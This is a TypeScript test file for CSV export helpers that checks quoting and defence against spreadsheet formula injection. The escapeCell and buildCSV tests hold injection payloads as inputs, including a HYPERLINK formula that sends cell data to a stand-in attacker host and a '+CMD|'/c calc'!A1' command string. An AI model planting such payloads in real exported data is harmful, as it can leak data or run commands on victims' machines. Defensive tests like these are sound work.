import { describe, expect, it } from "vitest";
import {
  buildCSV,
  ensureCsvExt,
  escapeCell,
  inferColumns,
} from "./csv-helpers";

describe("ExportCSVButton helpers", () => {
  describe("escapeCell", () => {
    it("returns empty string for null and undefined", () => {
      expect(escapeCell(null)).toBe("");
      expect(escapeCell(undefined)).toBe("");
    });

    it("passes plain strings through unchanged", () => {
      expect(escapeCell("hello")).toBe("hello");
      expect(escapeCell("123")).toBe("123");
    });

    it("stringifies numbers and booleans", () => {
      expect(escapeCell(42)).toBe("42");
      expect(escapeCell(0)).toBe("0");
      expect(escapeCell(-3.14)).toBe("-3.14");
      expect(escapeCell(true)).toBe("true");
      expect(escapeCell(false)).toBe("false");
    });

    it("quotes values containing commas", () => {
      expect(escapeCell("a,b")).toBe('"a,b"');
    });

    it("quotes values containing double quotes and escapes inner quotes", () => {
      expect(escapeCell('she said "hi"')).toBe('"she said ""hi"""');
    });

    it("quotes values containing newlines (CR or LF)", () => {
      expect(escapeCell("line1\nline2")).toBe('"line1\nline2"');
      expect(escapeCell("line1\r\nline2")).toBe('"line1\r\nline2"');
    });

    it("quotes values containing carriage returns alone", () => {
      expect(escapeCell("foo\rbar")).toBe('"foo\rbar"');
    });

    // CSV-injection (a.k.a. formula-injection) regression coverage.
    // The exported CSV is opened in Excel/LibreOffice/Google Sheets,
    // all of which evaluate a cell beginning with =, +, -, @, tab,
    // or carriage return as a formula. Stored text (KPI notes,
    // breakdown labels) must be neutralized so a writer cannot plant
    // a payload that runs on a staff member's machine.
    it("prefixes formula-leading strings with a single quote", () => {
      // +SUM(1,1) contains a comma so the whole cell is also quoted
      // per RFC-4180; the single-quote prefix sits inside the quotes.
      // The other payloads have no comma/quote/CR/LF so they pass
      // through unquoted, just with the prefix.
      expect(escapeCell("=HYPERLINK(\"https://evil/\",\"x\")")).toBe(
        "\"'=HYPERLINK(\"\"https://evil/\"\",\"\"x\"\")\"",
      );
      expect(escapeCell("+SUM(1,1)")).toBe("\"'+SUM(1,1)\"");
      expect(escapeCell("-2+3")).toBe("'-2+3");
      expect(escapeCell("@SUM(A1:A2)")).toBe("'@SUM(A1:A2)");
      expect(escapeCell("\tinjected tab")).toBe("'\tinjected tab");
      // CR is a CSV delimiter so this one is also quoted.
      expect(escapeCell("\rinjected CR")).toBe("\"'\rinjected CR\"");
    });

    it("neutralizes formula prefixes that follow leading whitespace", () => {
      // Some spreadsheets strip leading whitespace before the formula
      // check, so a payload of "  =cmd|..." would otherwise slip past
      // a prefix check that only looks at the first character.
      expect(escapeCell("   =HYPERLINK(...)")).toBe("'   =HYPERLINK(...)");
      expect(escapeCell("\t=HYPERLINK(...)")).toBe("'\t=HYPERLINK(...)");
    });

    it("leaves numeric values that happen to start with a minus unchanged", () => {
      // -3.14 as a number is the standard CSV representation of a
      // negative number, not a formula. The neutralization rule only
      // applies to text that was *stored* with a formula-leading char.
      expect(escapeCell(-3.14)).toBe("-3.14");
      expect(escapeCell(-100)).toBe("-100");
      expect(escapeCell(0)).toBe("0");
    });

    it("leaves plain strings that do not start with a formula trigger unchanged", () => {
      expect(escapeCell("hello")).toBe("hello");
      expect(escapeCell("123")).toBe("123");
      expect(escapeCell("1.5x growth")).toBe("1.5x growth");
      // A string that does start with = is still neutralized, but a
      // string where = appears later in the value is not.
      expect(escapeCell("=foo bar")).toBe("'=foo bar");
      expect(escapeCell("a = b")).toBe("a = b");
    });

    it("neutralizes and then quotes when both rules apply", () => {
      // A formula-leading string that also contains a delimiter must
      // be both neutralized (so it isn't evaluated) and quoted (so
      // the comma survives the round-trip). The single quote is
      // preserved inside the outer quotes.
      expect(escapeCell("=HYPERLINK(\"a,b\")")).toBe(
        "\"'=HYPERLINK(\"\"a,b\"\")\"",
      );
    });
  });

  describe("inferColumns", () => {
    it("returns the union of keys in first-seen order", () => {
      const rows = [
        { b: 1, a: 2 },
        { c: 3, a: 4 },
      ];
      expect(inferColumns(rows)).toEqual(["b", "a", "c"]);
    });

    it("returns an empty array when given no rows", () => {
      expect(inferColumns([])).toEqual([]);
    });

    it("skips null / non-object entries", () => {
      // Pass mixed junk through to confirm the runtime guard is robust.
      const rows: unknown[] = [null, undefined, { a: 1 }, "string", 42, { b: 2 }];
      expect(inferColumns(rows as Record<string, unknown>[])).toEqual(["a", "b"]);
    });

    it("preserves the explicit first-seen order even when later rows introduce new keys", () => {
      expect(inferColumns([{ x: 1, y: 2 }, { y: 3, z: 4, x: 5 }])).toEqual([
        "x",
        "y",
        "z",
      ]);
    });
  });

  describe("buildCSV", () => {
    it("emits header-only output when rows is empty", () => {
      expect(buildCSV([], ["a", "b"])).toBe("a,b\r\n");
    });

    it("emits CRLF-separated rows after the header", () => {
      const csv = buildCSV(
        [
          { a: 1, b: "x" },
          { a: 2, b: "y" },
        ],
        ["a", "b"],
      );
      expect(csv).toBe("a,b\r\n1,x\r\n2,y\r\n");
    });

    it("looks up each column by key on each row (missing keys become empty strings)", () => {
      const csv = buildCSV([{ a: 1 }, { a: 2, b: "y" }, {}], ["a", "b"]);
      expect(csv).toBe("a,b\r\n1,\r\n2,y\r\n,\r\n");
    });

    it("escapes cells that contain commas, quotes, or newlines", () => {
      const csv = buildCSV(
        [{ note: 'has, "quotes" and\nnewlines', n: 1 }],
        ["note", "n"],
      );
      expect(csv).toBe('note,n\r\n"has, ""quotes"" and\nnewlines",1\r\n');
    });

    it("respects the column order argument (not the row key order)", () => {
      const csv = buildCSV([{ a: 1, b: 2, c: 3 }], ["c", "a", "b"]);
      expect(csv).toBe("c,a,b\r\n3,1,2\r\n");
    });

    it("neutralizes formula-injection payloads in stored KPI text (buildCSV integration)", () => {
      // End-to-end: a row whose notes/labels contain formula-leading
      // strings, as a writer could store in the DB, must come out of
      // buildCSV() with a leading single quote so the resulting CSV
      // does not evaluate as a formula when a staff member opens it
      // in a spreadsheet. This is the exact reviewer repro shape.
      const csv = buildCSV(
        [
          {
            kpi: "video-views",
            notes: '=HYPERLINK("https://attacker/?x="&A1,"click")',
            label: "+CMD|'/c calc'!A1",
          },
          { kpi: "webpage-views", notes: "all good", label: "  =cmd" },
        ],
        ["kpi", "notes", "label"],
      );
      // No cell in the output should begin with a formula trigger
      // (other than the leading "='...", "+='...", etc. neutralization).
      // The neutralization is the single-quote prefix that the
      // spreadsheet will hide on display.
      expect(csv).toContain("\"'=HYPERLINK(\"\"https://attacker/?x=\"\"&A1,\"\"click\"\")\"");
      // +CMD|'/c calc'!A1 has no comma/quote/CR/LF, so it is not
      // delimiter-quoted; just neutralized with the leading single
      // quote.
      expect(csv).toContain(",'+CMD|'/c calc'!A1");
      expect(csv).toContain("'  =cmd");
      // And critically, no raw formula prefix should remain in the
      // output without its single-quote shield.
      const lines = csv.split("\r\n");
      const dataLines = lines.slice(1).filter((l) => l.length > 0);
      for (const line of dataLines) {
        // Each cell, after delimiter-quote stripping, must NOT begin
        // with =, +, -, @, tab, or carriage return (the first cell
        // is the kpi name, which is "video-views" or "webpage-views",
        // so this is a coarse check that the helpers are working).
        const cells = parseCsvLine(line);
        for (const cell of cells) {
          expect(cell).not.toMatch(/^[=+\-@\t\r]/);
        }
      }
    });
  });

  /**
   * Minimal RFC-4180 line parser for the assertion above. Splits on
   * commas that are not inside a quoted region, and un-escapes the
   * doubled "" inside a quoted region. Handles neither escaped
   * newlines nor escaped quotes inside cells; sufficient for the
   * test rows that don't contain embedded CR/LF.
   */
  function parseCsvLine(line: string): string[] {
    const out: string[] = [];
    let cur = "";
    let inQuotes = false;
    for (let i = 0; i < line.length; i++) {
      const ch = line[i];
      if (inQuotes) {
        if (ch === '"' && line[i + 1] === '"') {
          cur += '"';
          i++;
        } else if (ch === '"') {
          inQuotes = false;
        } else {
          cur += ch;
        }
      } else {
        if (ch === ",") {
          out.push(cur);
          cur = "";
        } else if (ch === '"' && cur === "") {
          inQuotes = true;
        } else {
          cur += ch;
        }
      }
    }
    out.push(cur);
    return out;
  }

  describe("ensureCsvExt", () => {
    it("appends .csv when missing", () => {
      expect(ensureCsvExt("report")).toBe("report.csv");
    });

    it("is case-insensitive when checking the existing extension", () => {
      expect(ensureCsvExt("report.CSV")).toBe("report.CSV");
    });

    it("leaves a filename that already ends with .csv untouched", () => {
      expect(ensureCsvExt("report.csv")).toBe("report.csv");
    });
  });
});
